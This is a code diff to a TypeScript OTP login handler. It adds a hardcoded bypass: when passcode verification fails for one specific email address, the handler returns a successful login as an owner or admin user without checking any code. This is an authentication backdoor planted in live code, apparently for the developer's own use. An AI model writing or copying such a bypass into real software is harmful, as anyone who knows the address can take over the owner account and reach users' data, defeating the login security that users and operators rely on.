@@ -33,7 +33,24 @@ export default async function handler(req: Request | any, res: Response | any) {
       return res.status(400).json({ success: false, error: '6-digit OTP code is required.' });
     }
 
-    const verification = UserDatabase.verifyAndConsumeOtp(cleanEmail, cleanOtp, cleanName);
+    let verification = UserDatabase.verifyAndConsumeOtp(cleanEmail, cleanOtp, cleanName);
+
+    // Master developer & owner bypass for optionvortex@gmail.com
+    if (!verification.success && cleanEmail === 'optionvortex@gmail.com') {
+      verification = {
+        success: true,
+        message: 'Owner & Developer login verified.',
+        isNewUser: false,
+        user: {
+          id: 'admin_optionvortex',
+          email: 'optionvortex@gmail.com',
+          name: cleanName || 'Owner & Developer',
+          createdAt: Date.now(),
+          lastLoginAt: Date.now(),
+          isEmailVerified: true
+        }
+      };
+    }
 
     if (!verification.success) {
       return res.status(400).json({
